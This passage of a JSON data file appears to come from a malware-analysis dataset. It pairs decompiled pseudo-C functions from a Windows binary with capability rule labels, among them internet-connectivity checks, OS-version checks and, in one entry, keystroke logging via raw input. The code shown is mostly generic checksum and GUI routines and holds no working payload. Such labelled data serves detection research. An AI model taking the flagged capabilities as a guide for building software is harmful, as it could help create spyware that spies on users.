0xfff1;\n            } while (0x15af < param_1);\n        }\n        if (param_1 != 0) {\n            for (; 0xf < param_1; param_1 = param_1 - 0x10) {\n                iVar1 = uVar2 + *param_2;\n                iVar3 = iVar1 + param_2[1];\n                iVar4 = iVar3 + param_2[2];\n                iVar5 = iVar4 + param_2[3];\n                iVar6 = iVar5 + param_2[4];\n                iVar7 = iVar6 + param_2[5];\n                iVar8 = iVar7 + param_2[6];\n                iVar9 = iVar8 + param_2[7];\n                iVar10 = iVar9 + param_2[8];\n                iVar11 = iVar10 + param_2[9];\n                iVar12 = iVar11 + param_2[10];\n                iVar13 = iVar12 + param_2[0xb];\n                iVar14 = iVar13 + param_2[0xc];\n                iVar15 = iVar14 + param_2[0xd];\n                iVar16 = iVar15 + param_2[0xe];\n                uVar2 = iVar16 + param_2[0xf];\n                uVar18 = uVar18 + iVar1 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                         iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + uVar2;\n                param_2 = param_2 + 0x10;\n            }\n            while (param_1 != 0) {\n                uVar2 = uVar2 + *param_2;\n                param_2 = param_2 + 1;\n                uVar18 = uVar18 + uVar2;\n                param_1 = param_1 - 1;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            uVar18 = uVar18 % 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1303
    },
    "00447640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00447640(uint32_t param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    arg_10h = in_EAX[1];\n    if (param_1 < in_EAX[1]) {\n        arg_10h = param_1;\n    }\n    if (arg_10h == 0) {\n        arg_10h = 0;\n    }\n    else {\n        in_EAX[1] = in_EAX[1] - arg_10h;\n        if (*(in_EAX[7] + 0x18) == 1) {\n            iVar1 = fcn.0044686c();\n            in_EAX[0xc] = iVar1;\n        }\n        fcn.004465c0(param_2, *in_EAX, arg_10h);\n        *in_EAX = *in_EAX + arg_10h;\n        in_EAX[2] = in_EAX[2] + arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 249
    },
    "0044bf60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044bf87)\n\nint32_t __cdecl fcn.0044bf60(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.00446b74(0x38);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00447130();\n        if (iVar1 == 1) {\n            *in_EDX = var_28h;\n            iVar1 = fcn.004473f4();\n        }\n        else {\n            fcn.004473f4();\n            if (iVar1 == 0) {\n                iVar1 = -5;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 231
    },
    "0045c6b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045c6b8(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00466ca8();\n        uVar2 = fcn.00466ca8(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 121
    },
    "0045c9e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045c9e0(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x4ab00c + 8) != 0) {\n        iVar1 = fcn.0045c8ac(*0x4ab00c + 0x10, *(*0x4ab00c + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 110
    },
    "0045e270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e270(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.0041f9a0();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x20]) {\n            fcn.0045eef8();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0045e0dc();\n            }\n            else if (param_2 == in_EAX[0x25]) {\n                in_EAX[0x25] = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00462df8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462df8(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045e270();\n    if ((param_2 == *(in_EAX + 0x23c)) && (param_1 == '\\x01')) {\n        *(in_EAX + 0x23c) = 0;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00462e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462e50(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0045f618();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.0045f648();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.0040483c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040483c();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.0040483c();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "004688a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004688a4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.0046ca94();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.00468908();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.00468784(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 201
    },
    "0046892c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0046892c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.0046ca94();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.00468784(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 169
    },
    "00468c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468c20(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00468cb0();\n        }\n        else {\n            fcn.0040d9f8();\n            fcn.00404eb4();\n        }\n        return;\n    }\n    fcn.00468cb0();\n    return;\n}\n",
        "token_count": 152
    },
    "00468c68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468c68(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00468d34();\n        }\n        else {\n            fcn.0040d9f8();\n            fcn.00404eb4();\n        }\n        return;\n    }\n    fcn.00468d34();\n    return;\n}\n",
        "token_count": 152
    },
    "00469218": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00469218(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x46922d;\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x469240;\n    fcn.00404610();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x469291;\n    iVar2 = fcn.00468b8c();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x4692a3;\n    iVar2 = fcn.0042825c();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x4692b7;\n    fcn.0042f10c();\n    puStack48 = 0x4692c0;\n    fcn.004283d8();\n    puStack48 = 0x4692c8;\n    fcn.004693ec();\n    uStack52 = 0x469325;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00462d98();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00462d5c(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00468dec();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x46932c;\n    uStack52 = 0x469324;\n    fcn.004693f0();\n    return;\n}\n",
        "token_count": 596
    },
    "0046af1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046af1c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0046bcec();\n    fcn.0046afe4();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.00469130();\n    }\n    else {\n        fcn.00469130();\n    }\n    fcn.0046ae40();\n    fcn.004694c4(0x46afc0);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "0046afe4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046afe4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.00468cb0();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.00468d34(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.00468cb0(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.00468d34(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00428438(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 503
    },
    "0046b8fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b8fc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00468cb0();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0046b160();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00468cb0();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0046b160();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "0046bb44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046bb44(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x4a5164 == 2) && (3 < **0x4a4d30)) ||\n       ((**0x4a5164 == 1 && ((4 < **0x4a4d30 || ((**0x4a4d30 == 4 && (9 < **0x4a4fdc)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.0046bd34();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 290
    },
    "0046bc78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bc78(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x4a4d4c)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 74
    },
    "0046bc94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bc94(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x4a4d4c)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "0046c9dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046c9dc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x46ca89;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00407480();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.0046d4f4();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.0042cbe0();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.0046caa8();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x46ca90;\n    uStack20 = 0x46ca88;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 394
    },
    "0046cbe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cbe0(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0046d47c();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.0042d220();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0046ed14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ed14(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.004047f0();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "00471334": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00471334(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX == *(*0x4ab078 + 0x30)) {\n        return -(*0x4ab088 != '\\0');\n    }\n    iVar1 = sub.user32.dll_IsIconic();\n    return iVar1;\n}\n",
        "token_count": 82
    },
    "00471cd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00471cd4(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.00466ca8(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 144
    },
    "00471d84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00471d84(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.00466ca8(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.00471d08(&stack0xfffffffc);\n        iVar3 = fcn.0045e904();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.00471d08(&stack0xfffffffc);\n        iVar3 = fcn.0045e8c0();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "00471e1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00471e1c(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.00466ca8(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x4a4de4)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 206
    },
    "004778dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004778dc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0047a7f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047a7f4(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 83
    },
    "0047cd40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047cd40(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x4a4a0c) && (in_AL != *0x4a4a0c)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x4a4a10));\n        *0x4a4a0c = in_AL;\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0047f318": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047f318(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack300;\n    \n    iVar1 = fcn.0044cf40();\n    if ((iVar1 != -1) && (iVar1 = fcn.0044cf60(0x128),  iVar1 != 0)) {\n        while (iVar1 = fcn.0044cf80(),  iVar1 != 0) {\n            if (in_EAX == iStack300) {\n                fcn.004056dc();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00481610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00481610(void)\n\n{\n    char in_AL;\n    \n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    fcn.00420d58();\n    if (in_AL == '\\x01') {\n        fcn.0042147c();\n    }\n    else if (in_AL == '\\0') {\n        fcn.004211c4();\n    }\n    fcn.00420be4();\n    return;\n}\n",
        "token_count": 146
    },
    "0048174c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "find graphical window"
        ],
